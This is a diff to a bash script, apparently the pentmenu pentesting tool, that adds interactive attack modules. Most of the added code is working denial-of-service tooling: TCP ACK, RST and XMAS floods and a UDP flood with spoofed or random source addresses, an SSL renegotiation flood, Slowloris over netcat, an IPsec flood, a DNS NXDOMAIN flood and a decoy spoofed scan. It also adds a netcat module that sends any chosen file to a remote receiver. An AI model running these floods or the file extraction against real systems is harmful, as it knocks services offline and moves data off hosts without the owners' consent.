+#----hping3 is found, so use that for TCP ACK Flood
+	target_input
+#----need a port to send TCP ACK packets to
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----What source address to use? Manually defined, or random, or outgoing interface IP?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----should any data be sent with the ACK packet?  Default is to send no data
+	echo -ne "\n\e[38;5;19;1;48;5;245mSend data with ACK packet? [y]es or [n]o (default):${clear}"; read -i $SENDDATA -e SENDDATA
+	: ${SENDDATA:=n}
+if [[ $SENDDATA = y ]]; then
+#----we've chosen to send data, so how much should we send?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of data bytes to send (default 3000):${clear}"; read -i $DATA -e DATA
+	: ${DATA:=3000}
+#----If not an integer is entered, use default
+if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
+	DATA=3000 && echo -ne "\n${red}Invalid integer!  Using data length of 3000 bytes${clear}\n"
+fi
+#if $SENDDATA is not equal to y (yes) then send no data
+else
+	DATA=0
+fi
+#----start TCP ACK flood using values defined earlier
+#----note that virtual fragmentation is set. The default for hping3 is 16 bytes.
+#----fragmentation should therefore place more stress on the target system
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
+else
+	echo -ne "${red}Not a valid option!  Using interface IP\n"
+	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
+fi
+#----No hping3 so using nping for TCP ACK Flood
+else
+	echo -ne "${red}hping3 not found :( trying nping instead${clear}\n"
+	echo -ne "${yellow}Trying TCP ACK Flood with nping..this will work but is not ideal${clear}\n"
+#----need a valid target ip/hostname
+	target_input
+#----need a valid target port
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----define source IP or use outgoing interface IP
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP or use [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----How many packets to send per second?  default is 10k
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of packets to send per second (default is 10,000):${clear}"; read RATE
+	: ${RATE:=10000}
+#----default is 100k, so using default values will send 10k packets per second for 10 seconds
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter total number of packets to send (default is 100,000):${clear}"; read TOTAL
+	: ${TOTAL:=100000}
+	echo -ne "\n${green}Starting TCP ACK Flood...${clear}\n"
+#----begin TCP ACK flood using values defined earlier
+if [ "$SOURCE" = "i" ]; then
+	nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
+else
+	nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+fi
+fi
+}
+##
+#----START TCP RST FLOOD
+##
+rstflood() {
+	echo -ne "$(Info_Screen '
+-TCP RST Flood uses hping3...checking for hping3...')\n\n"
+if test -f "/usr/sbin/hping3"; then
+	echo -ne "${green}hping3 found, continuing!${clear}\n";
+#----hping3 is found, so use that for TCP RST Flood
+	target_input
+#----need a port to send TCP RST packets to
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----What source address to use? Manually defined, or random, or outgoing interface IP?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----should any data be sent with the RST packet?  Default is to send no data
+	echo -ne "\n\e[38;5;19;1;48;5;245mSend data with RST packet? [y]es or [n]o (default)${clear}"; read -i $SENDDATA -e SENDDATA
+	: ${SENDDATA:=n}
+if [[ $SENDDATA = y ]]; then
+#----we've chosen to send data, so how much should we send?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of data bytes to send (default 3000):${clear}"; read -i $DATA -e DATA
+	: ${DATA:=3000}
+#----If not an integer is entered, use default
+if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
+	DATA=3000 && echo -ne "${red}Invalid integer!  Using data length of 3000 bytes${clear}\n"
+fi
+#----if $SENDDATA is not equal to y (yes) then send no data
+else
+	DATA=0
+fi
+#----start TCP RST flood using values defined earlier
+#----note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
+#----fragmentation should therefore place more stress on the target system
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
+else
+	echo -ne "${red}Not a valid option!  Using interface IP${clear}\n"
+	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
+fi
+#----No hping3 so using nping for TCP RST Flood
+else
+	echo -ne "${red}hping3 not found :(${clear}${yellow} trying nping instead${clear}\n"
+	echo -ne "${yellow}Trying TCP RST Flood with nping..this will work but is not ideal${clear}\n"
+#----need a valid target ip/hostname
+	target_input
+#----need a valid target port
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----define source IP or use outgoing interface IP
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP or use [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----How many packets to send per second?  default is 10k
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of packets to send per second (default is 10,000):${clear}"; read RATE
+	: ${RATE:=10000}
+#----default is 100k, so using default values will send 10k packets per second for 10 seconds
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter total number of packets to send (default is 100,000):${clear}"; read TOTAL
+	: ${TOTAL:=100000}
+	echo -ne "${green}Starting TCP RST Flood...${clear}\n"
+#----begin TCP RST flood using values defined earlier
+if [ "$SOURCE" = "i" ]; then
+	nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
+else
+	nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+fi
+fi
+}
+##
+#----START TCP XMAS FLOOD
+##
+xmasflood() {
+	echo -ne "$(Info_Screen '
+-TCP XMAS Flood uses hping3...checking for hping3...')\n\n"
+if test -f "/usr/sbin/hping3"; then
+	echo -ne "${green}hping3 found, continuing!${clear}\n";
+#----hping3 is found, so use that for TCP XMAS Flood
+#----need a target IP/hostname
+	target_input
+#----need a port to send TCP XMAS packets to
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----What source address to use? Manually defined, or random, or outgoing interface IP?
+	echo -ne "\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----should any data be sent with the XMAS packet?  Default is to send no data
+	echo -ne "\n\e[38;5;19;1;48;5;245mSend data with XMAS packet? [y]es or [n]o (default)${clear}"; read -i $SENDDATA -e SENDDATA
+	: ${SENDDATA:=n}
+if [[ $SENDDATA = y ]]; then
+#----we've chosen to send data, so how much should we send?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of data bytes to send (default 3000):${clear}"; read -i $DATA -e DATA
+	: ${DATA:=3000}
+#----If not an integer is entered, use default
+if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
+	DATA=3000 && echo -ne "${red}Invalid integer!  Using data length of 3000 bytes${clear}\n"
+fi
+#----if $SENDDATA is not equal to y (yes) then send no data
+else
+	DATA=0
+fi
+#----start TCP XMAS flood using values defined earlier
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --rand-source -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -d $DATA --flood -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+else
+	echo -ne "${red}Not a valid option!  Using interface IP${clear}\n"
+	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+fi
+#----No hping3 so using nping for TCP RST Flood
+else
+	echo -ne "${red}hping3 not found :( ${clear}${yellow}trying nping instead${clear}\n"
+	echo -ne "${yellow}Trying TCP XMAS Flood with nping..this will work but is not ideal${clear}\n"
+#----need a valid target ip/hostname
+	target_input
+#----need a valid target port
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----define source IP or use outgoing interface IP
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP or use [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----How many packets to send per second?  default is 10k
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of packets to send per second (default is 10,000):${clear}"; read RATE
+	: ${RATE:=10000}
+#----default is 100k, so using default values will send 10k packets per second for 10 seconds
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter total number of packets to send (default is 100,000):${clear}"; read TOTAL
+	: ${TOTAL:=100000}
+	echo -ne "${green}Starting TCP XMAS Flood...${clear}\n"
+#----begin TCP RST flood using values defined earlier
+if [ "$SOURCE" = "i" ]; then
+	nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 $TARGET
+else
+	nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+fi
+fi
+}
+##
+#----START UDP FLOOD
+##
+udpflood() {
+	echo -ne "$(Info_Screen '
+-UDP Flood uses hping3...checking for hping3...')\n\n"
+#----check for hping on the local system
+if test -f "/usr/sbin/hping3"; then
+	echo -ne "${green}hping3 found, continuing!${clear}\n";
+#----hping3 is found, so use that for UDP Flood
+#----need a valid target IP/hostname
+	target_input
+#----need a valid target UDP port
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----curently only accepts stdin.  Can't define a file to read from
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter random string (data to send):${clear}"; read DATA
+#----what source IP should we write to sent packets?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----start the attack using values defined earlier
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood --udp --sign $DATA -p $PORT $TARGET
+#----if no valid source option is selected, use outgoing interface IP
+else
+	echo -ne "${red}Not a valid option! ${clear}${yellow} Using interface IP${clear}\n"
+	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood --udp --sign $DATA -p $PORT $TARGET
+fi
+#----If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
+else
+	echo -ne "${red}hping3 not found :( ${clear}${yellow}trying nping instead${clear}\n"
+	echo -ne "${yellow}Trying UDP Flood with nping..${clear}\n"
+#----need a valid target IP/hostname
+	target_input
+#----need a port to send UDP packets to
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----what source address should we use in sent packets?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP or use [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----how many packets should we try to send each second?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of packets to send per second (default is 10,000):${clear}"; read RATE
+	: ${RATE:=10000}
+#----how many packets should we send in total?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter total number of packets to send (default is 100,000):${clear}"; read TOTAL
+	: ${TOTAL:=100000}
+#----default values will send 10k packets each second, for 10 seconds
+#----curently only accepts stdin.  Can't define a file to read from
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter string to send (data):${clear}"; read DATA
+	echo -ne "${green}Starting UDP Flood...${clear}\n"
+#----start the UDP flood using values we defined earlier
+if [ "$SOURCE" = "i" ]; then
+	nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
+else
+	nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+fi
+fi
+}
+##
+#----START SSL DOS
+##
+ssldos() {
+echo -ne "$(Info_Screen '
+-Using openssl for SSL/TLS DOS')\n\n"
+#----need a target IP/hostname
+	target_input
+#----need a target port
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter target port (defaults to 443):${clear}"; read -i $PORT -e PORT
+	: ${PORT:=443}
+#----check a valid target port is entered otherwise assume port 443
+if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+	PORT=443 && echo -ne "${red}You provided a string, not a port number! ${clear}${yellow} Reverting to port 443${clear}\n"
+fi
+if [ "$PORT" -lt "1" ]; then
+	PORT=443 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 443${clear}\n"
+elif [ "$PORT" -gt "65535" ]; then
+	PORT=443 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 443${clear}\n"
+else
+	echo -ne "${yellow}Using port ${clear}$PORT\n"
+fi
+#----do we want to use client renegotiation?
+	echo -ne "\n\e[38;5;19;1;48;5;245mUse client renegotiation? [y]es or [n]o (default):${clear}"; read NEGOTIATE
+	: ${NEGOTIATE:=n}
+if [[ $NEGOTIATE = y ]]; then
+#----if client renegotiation is selected for use, launch the attack supporting it
+	echo -ne "${green}Starting SSL DOS attack...Use 'Ctrl c' to quit${clear}\n" && sleep 1
+while : for i in {1..10}
+	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
+done
+elif [[ $NEGOTIATE = n ]]; then
+#----if client renegotiation is not requested, lauch the attack without support for it
+	echo -ne "${green}Starting SSL DOS attack...Use 'Ctrl c' to quit${clear}\n" && sleep 1
+while : for i in {1..10}
+	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
+done
+#----if an invalid option is chosen for client renegotiation, launch the attack without it
+else
+	echo -ne "${red}Invalid option, assuming no client renegotiation${clear}\n${green}Starting SSL DOS attack...Use 'Ctrl c' to quit${clear}\n" && sleep 1
+while : for i in {1..10}
+	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
+done
+fi
+}
+##
+#----START SLOW LORIS
+##
+slowloris() {
+	echo -ne "$(Info_Screen '
+-Using netcat for Slowloris attack....')\n" && sleep 1
+#----need a target IP or hostname
+	target_input
+#----need a target port
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----how many connections should we attempt to open with the target?
+#----there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of connections to open (default 2000):${clear}"; read CONNS
+	: ${CONNS:=2000}
+#----ensure a valid integer is entered
+if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
+	CONNS=2000 && echo -ne "${red}Invalid integer! ${clear}${yellow} Using 2000 connections${clear}\n"
+fi
+#----how long do we wait between sending header lines?
+#----too long and the connection will likely be closed
+#----too short and our connections have little/no effect on server
+#----either too long or too short is bad.  Default random interval is a sane choice
+echo -ne "\n\e[38;5;19;1;48;5;245mChoose interval between sending headers.${clear}\n"
+echo -ne "\n\e[38;5;19;1;48;5;245mDefault is [r]andom, between 5 and 15 seconds, or enter interval in seconds:${clear}"; read INTERVAL
+	: ${INTERVAL:=r}
+if [[ "$INTERVAL" = "r" ]]; then
+#----if default (random) interval is chosen, generate a random value between 5 and 15
+#----note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
+	INTERVAL=$((RANDOM % 11 + 5))
+#----check that r (random) or a valid number is entered
+elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]; then
+#----if not r (random) or valid number is chosen for interval, assume r (random)
+	INTERVAL=$((RANDOM % 11 + 5)) && echo -ne "${red}Invalid integer! ${clear}${yellow} Using random value between 5 and 15 seconds${clear}\n"
+fi
+#----run stunnel_client function
+stunnel_client
+if [[ "$SSL" = "y" ]]; then
+#----if SSL is chosen, set the attack to go through local stunnel listener
+	echo -ne "${green}Launching Slowloris....Use 'Ctrl c' to exit prematurely${clear}\n" && sleep 1
+	i=1
+while [ "$i" -le "$CONNS" ]; do
+	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+	echo -ne "${yellow}Opened $CONNS connections....returning to menu${clear}\n"
+else
+#----if SSL is not chosen, launch the attack on the server without using a local listener
+	echo -ne "${green}Launching Slowloris....Use 'Ctrl c' to exit prematurely${clear}\n" && sleep 1
+	i=1
+while [ "$i" -le "$CONNS" ]; do
+	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+#----return to menu once requested number of connections has been opened or resources are exhausted
+	echo -ne "${yellow}Opened $CONNS connections....returning to menu${clear}\n"
+fi
+}
+##
+#----START IPSEC DOS
+##
+ipsecdos() {
+	echo -ne "$(Info_Screen '
+-This module will attempt to spoof an IPsec server, with a spoofed source address')\n\n"
+	target_input
+#----launch DOS with a random source address by default
+	echo -ne "${green}IPsec DOS underway...use 'Ctrl C' to stop${clear}\n" &&
+while :
+do ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
+done
+}
+##
+#----START DISTRACTION
+##
+distractionscan() {
+	echo -ne "$(Info_Screen '
+-This module will send a TCP SYN scan with a spoofed source address"
+-This module is designed to be obvious, to distract your target from any real scan
+-or other activity you may actually be performing')\n\n"
+#----need target IP/hostname
+	target_input
+#----need a spoofed source address
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter spoofed source address:${clear}"; read -i $SOURCE -e SOURCE
+#----use hping to perform multiple obvious TCP SYN scans
+for i in {1..50}; do echo "sending scan $i" && hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
+}
+##
+#----START NXDOMAIN FLOOD
+##
+nxdomainflood() {
+	echo -ne "$(Info_Screen '
+-This module is designed to stress test a DNS server by flooding it with queries
+-for domains that do not exist')\n\n"
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter the IP address of the target DNS server:${clear}"; read -i $DNSTARGET -e DNSTARGET
+	echo -ne "${green}Starting DNS NXDOMAIN Query Flood to $DNSTARGET${clear}\n" && sleep 1
+while :
+do dig $RANDOM.$RANDOM$RANDOM @$DNSTARGET
+done
+}
+##
+#----EXTRACTION menu
+##
+extractionmenu() {
+MenuTitle EXTRACTION MENU
+MenuColor 20 1 SEND FILE
+MenuColor 20 2 CREATE LISTENER
+MenuColor 20 3 RETURN TO MAIN MENU
+MenuEnd 23
+	case $m_a in
+	1) sendfile ;;
+	2) listener ;;
+	3) reconmenu ;;
+	0) exit 0 ;;
+	[bB]) reconmenu ;;
+	*) invalid_entry ; extractionmenu ;;
+	esac
+}
+##
+#----START SENDFILE
+##
+sendfile() {
+echo -ne "$(Info_Screen '
+-This module will allow you to send a file over TCP or UDP
+-You can use the Listener to receive such a file')\n\n"
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter protocol, [t]cp (default) or [u]dp:${clear}"; read -i $PROTO -e PROTO
+	: ${PROTO:=t}
+#----if not t (tcp) or u (udp) is chosen, assume tcp required
+if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
+	echo -ne "${red}Invalid protocol option selected,${clear}${yellow} assuming tcp!${clear}\n" && PROTO=t && echo ""
+fi
+#----need to know the IP of the receiving end
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter the IP of the receving server:${clear}"; read -i $RECEIVER -e RECEIVER
+#----need to know a destination port on the server
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----what file are we sending?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter the FULL PATH of the file you want to extract:${clear}"; read -i $EXTRACT -e EXTRACT
+#----send the file
+	echo -ne "${green}Sending the file to${clear} $RECEIVER:$PORT\n"
+if [ "$PROTO" = "t" ]; then
+	nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
+else
+	nc -n -N -u $RECEIVER $PORT < $EXTRACT
+fi
+	echo "Done"
+#----generate hashes of file we are sending
+echo -ne "${yellow}Generating hash checksums${clear}\n"
+md5sum $EXTRACT
+echo ""
+sha512sum $EXTRACT
+sleep 1
+}
+##
+#----START LISTENER
+##
+listener() {
+echo -ne "$(Info_Screen '
+-This module will create a TCP or UDP listener using netcat
+-Any data (string or file) received will be written out to ./pentmenu.listener.out')\n\n"
+	echo "Enter protocol, [t]cp (default) or [u]dp:"
+	read -i $PROTO -e PROTO
+	: ${PROTO:=t}
+#----if not t (tcp) or u (udp) is chosen, assume tcp listener required
+if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
+	echo -ne "${red}Invalid protocol option selected,${clear}${yellow} assuming tcp!${clear}" && PROTO=t && echo ""
+fi
+#----show listening ports on system using ss (if available) otherwise use netstat
+	echo -ne "$(Info_Screen '
+-Listing current listening ports on this system.
+-Do not attempt to create a listener on one of these ports, it will not work.')\n\n"
+if test -f "/bin/ss"; then
+	LISTPORT=ss;
+else
+	LISTPORT=netstat
+fi
+#----now we can ask what port to create listener on
+#----it cannot of course listen on a port already in use
+	$LISTPORT -$PROTO -n -l
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter port number to listen on (defaults to 8000):${clear}"; read -i $PORT -e PORT
+	: ${PORT:=8000}
+#----if not an integer is entered, assume default port 8000
+if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+	PORT=8000 && echo -ne "${red}You provided a string, not a port number! ${clear}${yellow} Reverting to port 8000${clear}\n"
+fi
+#----ensure a valid port number, between 1 and 65,535 (inclusive) is entered
+if [ "$PORT" -lt "1" ]; then
+	PORT=8000 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 8000${clear}\n"
+elif [ "$PORT" -gt "65535" ]; then
+	PORT=8000 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 8000${clear}\n"
+fi
+#----define where to save everything received to the listener
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter output file (defaults to pentmenu.listener.out):${clear}"; read -i $OUTFILE -e OUTFILE
+	: ${OUTFILE:=pentmenu.listener.out}
+	echo -ne "\n${yellow}Use ctrl c to stop${clear}\n"
+#----create the listener
+if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
+	nc -n -l -v -p $PORT > $OUTFILE
+elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
+	nc -n -l -v -p $PORT > $OUTFILE
+elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
+	nc -n -u -k -l -v -p $PORT > $OUTFILE
+elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
+	nc -n -u -k -l -v -p $PORT > $OUTFILE
+fi
+#----done message and checksums will only work for tcp file transfer
+#----with udp, the connection has to be manually closed with 'ctrl C'
+sync && echo -ne "\n${green}Done${clear}\n"
+#----generate hashes of file received
+echo -ne "${green}Generating hash checksums${clear}\n"
+md5sum $OUTFILE
+echo ""
+sha512sum $OUTFILE
+sleep 1
+}
+##
+#----START SHOW README
+##
+#----use curl to show the readme file
+showreadme() {
+curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
+}
+##
+#----START STUNNEL
+##
+stunnel_client() {
+	echo -ne "\n\e[38;5;19;1;48;5;245muse SSL/TLS? [y]es or [n]o (default):${clear}"; read SSL
+	: ${SSL:=n}
+#----if not using SSL/TLS, carry on what we were doing
+#----otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
+if [[ "$SSL" = "y" ]]; then
+	echo -ne "${yellow}Using SSL/TLS${clear}"
+	LHOST=127.0.0.1
+	LPORT=9991
+#----ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
+	grep -q $LPORT /etc/services
+if [[ $? = 1 ]]; then
+	echo "Adding pentmenu stunnel service to /etc/services" && chmod 777 /etc/services && echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services && chmod 644 /etc/services
+fi
+#----is ss is available, use that to shoew listening ports
+if test -f "/bin/ss"; then
+	LISTPORT=ss;
+#otherwise use netstat
+else
+	LISTPORT=netstat
+fi
+#----show listening ports and check for port 9991
+	$LISTPORT -tln |grep -q $LPORT
+if [[ "$?" = "1" ]]; then
+#----if nothing is running on port 9991, create stunnel configuration
+	echo -ne "${yellow}Creating stunnel client on ${clear}\n$LHOST:$LPORT"
+	rm -f /etc/stunnel/pentmenu.conf;
+	touch /etc/stunnel/pentmenu.conf && chmod 777 /etc/stunnel/pentmenu.conf
+	echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
+	echo "client=yes" >> /etc/stunnel/pentmenu.conf
+	echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
+	echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
+	echo "verify=0" >> /etc/stunnel/pentmenu.conf
+	chmod 644 /etc/stunnel/pentmenu.conf
+	stunnel /etc/stunnel/pentmenu.conf && sleep 1
+#----if stunnel listener is already active we don't bother recreating it
+else
+	echo -ne "${yellow}Looks like stunnel is already listening on port 9991, so not recreating${clear}\n"
+fi
+fi
+}
+mainmenu
+}
+##
 #----Recon scan menu
 ##
-MenuTitle RECON SCAN MENU ; MenuColor 19 1 TCPDUMP SCAN ; MenuColor 19 2 NMAP SCAN ; MenuColor 19 3 TRACEROUTE SCAN ; MenuColor 19 4 WHOIS LOOKUP SCAN ; MenuColor 19 5 DNS LOOKUP SCAN
-MenuColor 19 6 PING TARGET SCAN ; MenuColor 19 7 TARGET PORT SCAN ; MenuColor 19 8 SSL/TLS SSLSCAN ; MenuColor 19 9 RETURN TO MAIN MENU ; MenuEnd 22
+MenuTitle RECON SCAN MENU ; MenuColor 20 1 TCPDUMP SCAN ; MenuColor 20 2 NMAP SCAN ; MenuColor 20 3 TRACEROUTE SCAN ; MenuColor 20 4 WHOIS LOOKUP SCAN ; MenuColor 20 5 DNS LOOKUP SCAN
